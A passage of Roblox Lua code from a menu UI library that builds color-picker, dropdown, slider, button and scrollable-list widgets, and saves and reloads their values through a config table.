												releaseconnection:Disconnect() 
											end 
										end) 
									end) 

									Button.MouseButton1Down:Connect(function() 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									function Element:SetValue(value) 
										Element.value = value 
										local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
										ColorH, ColorS, ColorV = duplicate:ToHSV() 
										ColorH = C.CLAMP(ColorH,0,1) 
										ColorS = C.CLAMP(ColorS,0,1) 
										ColorV = C.CLAMP(ColorV,0,1) 

										ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
										Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
										ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
										update() 
										Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
									end 
								elseif type == "Dropdown" then 
									tabsize = tabsize + C.UDIM2(0,0,0,39) 
									Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = Element.value.Dropdown 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = getMainColor() 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									Drop.CanvasSize = C.UDIM2(1, 0, 0, 17*num) 
									local first = true 

									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												Element.value.Dropdown = v 
												abcd.Text = v 
												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  getMainColor()}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end 

									function Element:SetValue(val) 
										Element.value = val 
										abcd.Text = val.Dropdown 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									
									
									
									
									
					
									
									
									
									
									
									
								elseif type == "Slider" then 

									tabsize = tabsize + C.UDIM2(0,0,0,25) 

								local Slider = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 
								local Button = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local UIGradient = C.INST("UIGradient") 
								local Value = C.INST("TextLabel") 

								Slider.Name = "Slider" 
								Slider.Parent = tab1 
								Slider.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider.BackgroundTransparency = 1.000 
								Slider.Position = C.UDIM2(0, 0, 0.653061211, 0) 
								Slider.Size = C.UDIM2(1, 0, 0, 25) 

								TextLabel.Parent = Slider 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								Button.Name = "Button" 
								Button.Parent = Slider 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 15) 
								Button.Size = C.UDIM2(0, 175, 0, 5) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Frame.Parent = Button 
								Frame.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame.BorderSizePixel = 0 
								Frame.Size = C.UDIM2(0.5, 0, 1, 0) 
								
								UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, getMainColor()), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient.Rotation = 90
								UIGradient.Parent = Frame


								Value.Name = "Value" 
								Value.Parent = Slider 
								Value.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value.BackgroundTransparency = 1.000 
								Value.Position = C.UDIM2(0, 30, 0, 15) 
								Value.Size = C.UDIM2(0, 175, 0, 5)  
								Value.Font = Enum.Font.Gotham 
								Value.Text = "50" 
								Value.TextStrokeTransparency = 0.000
								Value.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value.TextSize = 11.000 
								local min, max, default = data.min or 0, data.max or 100, data.default or 0 
								Element.value = {Slider = default} 

								function Element:SetValue(value) 
									Element.value = value 
									local a 
									if min > 0 then 
										a = ((Element.value.Slider - min)) / (max-min) 
									else 
										a = (Element.value.Slider-min)/(max-min) 
									end 
									Value.Text = Element.value.Slider 
									Frame.Size = C.UDIM2(a,0,1,0) 
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(value) 
								end 
								local a 
								if min > 0 then 
									a = ((Element.value.Slider - min)) / (max-min) 
								else 
									a = (Element.value.Slider-min)/(max-min) 
								end 
								Value.Text = Element.value.Slider 
								Frame.Size = C.UDIM2(a,0,1,0) 
								values[tabname][sectorname][tabtext][text] = Element.value 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button.MouseButton1Down:Connect(function() 
									Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
									val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) or 0 
									val *= 100
									val = math.floor(val)
									val = val / 100
									
									Value.Text = val 
									Element.value.Slider = val
									values[tabname][sectorname][tabtext][text] = Element.value 
									callback(Element.value) 
									moveconnection = mouse.Move:Connect(function() 
										Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
										val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min) 
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--print(typeof(val))
																					
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
										end
											--print(val)
											--pri
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end)
								end)
								elseif type == "Button" then 

									tabsize = tabsize + C.UDIM2(0,0,0,24) 
									local Button = C.INST("Frame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = "Button" 
									Button.Parent = tab1 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
									Button.Size = C.UDIM2(1, 0, 0, 24) 

									Button_2.Name = "Button" 
									Button_2.Parent = Button 
									Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
									Button_2.Size = C.UDIM2(0, 175, 0, 18) 
									Button_2.AutoButtonColor = false 
									Button_2.Font = Enum.Font.SourceSans 
									Button_2.Text = "" 
									Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button_2.TextSize = 11.000

									TextLabel.Parent = Button_2 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000

									function Element:SetValue() 
									end 

									Button_2.MouseButton1Down:Connect(function() 
										TextLabel.TextColor3 = getMainColor() 
										library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
										callback(TextLabel, TextLabel.Text)
											end)
										if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
										else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
										end
									end) 
									Button_2.MouseEnter:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									end) 
									Button_2.MouseLeave:Connect(function() 
										library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end) 
								end 
								ConfigLoad:Connect(function(cfg) 
									pcall(function()
										local fix = library:ConfigFix(cfg) 
										if fix[tabname][sectorname][tabtext][text] ~= nil then 
											Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
										end 
									end)
								end)
								ConfigLoad1:Connect(function(cfg)
									pcall(function()
										local fix = library:ConfigFix1(cfg) 
										if fix[tabname][sectorname][tabtext][text] ~= nil then 
											Element:SetValue(fix[tabname][sectorname][tabtext][text]) 
										end 
									end)
								end)

								return Element 
							end 


							if firs then 
								coroutine.wrap(function() 
									game:GetService('RunService').RenderStepped:Wait() 
									Section.Size = tabsize 
								end)() 
								selected = text 
								TextButton.TextColor3 = C.COL3RGB(255,255,255) 
								tab1.Visible = true 
								firs = false 
							end 

							return tab 
						end 
						library.tabs[tabname][sectorname] = MSector
						return MSector 
					end 
					function Tab:Sector(text, side) 
						local sectorname = text 
						local Sector = {} 
						values[tabname][text] = {} 
						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local UIListLayout = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Position = C.UDIM2(0.00358422939, 0, 0, 0) 
						Section.Size = C.UDIM2(1, 0, 0, 22) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -2) 

						local UIPadding = C.INST("UIPadding") 

						UIPadding.Parent = Inner 
						UIPadding.PaddingTop = UDim.new(0, 10) 

						UIListLayout.Parent = Inner 
						UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout.Padding = UDim.new(0,1) 

						function Sector:Element(type, text, data, callback) 
							local Element = {} 
							data = data or {} 
							callback = callback or function() end 
							values[tabname][sectorname][text] = {} 
							if type == "ScrollDrop" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Scroll = {}, Dropdown = "",UpdateValue = {}} 

								for i,v in pairs(data.options) do 
									Element.value.Scroll[i] = v[1] 
								end 

								local joe = {} 
								if data.alphabet then 
									local copy = {} 
									for i,v in pairs(data.options) do 
										C.INSERT(copy, i) 
									end 
									C.TBLSORT(copy, function(a,b) 
										return a < b 
									end) 
									joe = copy 
								else 
									for i,v in pairs(data.options) do 
										C.INSERT(joe, i) 
									end 
								end 

								local amount = data.Amount or 6 
								
								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Frame = C.INST('Frame')
								Frame.Size = C.UDIM2(0, 0, 0, amount * 16 + 8) 
								Frame.BorderSizePixel = 0
								--Frame.Visible = false
								Frame.Parent = Inner
								
								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								local TextLabel = C.INST("TextLabel") 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "lol" 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = getMainColor() 
								function MenuAccent(color)
									Drop.ScrollBarImageColor3 = color
								end

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 


								
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 

								local num = #joe 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(joe) do 
									do 
										local joell = v 
										local Scroll = C.INST("Frame") 
										local joe2 = data.options[v] 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
											abcd.Text = v 
											for i,v in pairs(Scroll.Parent:GetChildren()) do 
												if v:IsA("Frame") then 
													v.Visible = false 
												end 
											end 
											Element.value.Dropdown = v 
											Scroll.Visible = true 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										if first then 
											abcd.Text = v 
											Element.value.Dropdown = v 
										end 
										local Frame = C.INST("ScrollingFrame") 
										local UIListLayout = C.INST("UIListLayout") 

										Scroll.Name = "Scroll" 
										Scroll.Parent = Dropdown 
										Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										Scroll.BackgroundTransparency = 1.000 
										Scroll.Position = C.UDIM2(0, 0, 0, 0) 
										Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 
										Scroll.Visible = first 
										Scroll.Name = v 


										Frame.Name = "Frame"
										Frame.Parent = Scroll 
										Frame.Active = true 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(0, 30, 0, 40) 
										Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
										Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
										Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.ScrollBarThickness = 4 
										Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
										Frame.AutomaticCanvasSize = "Y" 
										Frame.ScrollBarImageColor3 = getMainColor() 
								function MenuAccent(color)
									Frame.ScrollBarImageColor3 = color
								end
										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
										local joll = true 
										updatescroll = function(value)
											for i,v in pairs(Frame:GetChildren()) do
												if v:IsA('TextButton') then
													v:Destroy()
												end
											end
											for i,v1 in ipairs(value) do 
												local Button = C.INST("TextButton") 
												local TextLabel = C.INST("TextLabel") 

												Button.Name = v1
												
												
												Button.Parent = Frame 
												Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
												Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
												Button.BorderSizePixel = 0 
												Button.Position = C.UDIM2(0, 30, 0, 16) 
												Button.Size = C.UDIM2(1, 0, 0, 16) 
												Button.AutoButtonColor = false 
												Button.Font = Enum.Font.SourceSans 
												Button.Text = "" 
												Button.TextColor3 = C.COL3RGB(0, 0, 0) 
												Button.TextSize = 11.000

												TextLabel.Parent = Button 
												TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
												TextLabel.BackgroundTransparency = 1.000 
												TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
												TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
												TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
												TextLabel.Font = Enum.Font.Gotham 
												TextLabel.Text = v1 
												TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
												TextLabel.TextSize = 11.000
												TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
												
												if joll then 
													joll = false 
													TextLabel.TextColor3 = getMainColor()
												end 

												Button.MouseButton1Down:Connect(function() 

													for i,v in pairs(Frame:GetChildren()) do 
														if v:IsA("TextButton") then 
															library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
														end 
													end 

													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 

													Element.value.Scroll[joell] = v1

													values[tabname][sectorname][text] = Element.value 
													callback(Element.value) 
												end) 
												Button.MouseEnter:Connect(function() 
													if Element.value.Scroll[joell] ~= v1 then 
														library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
													end 
												end) 
												Button.MouseLeave:Connect(function() 
													if Element.value.Scroll[joell] ~= v1 then 
														library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
													end 
												end) 
												
											end 
										end
										updatescroll(joe2)
										Element.value.UpdateValue[v] = updatescroll

										first = false 
									end 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
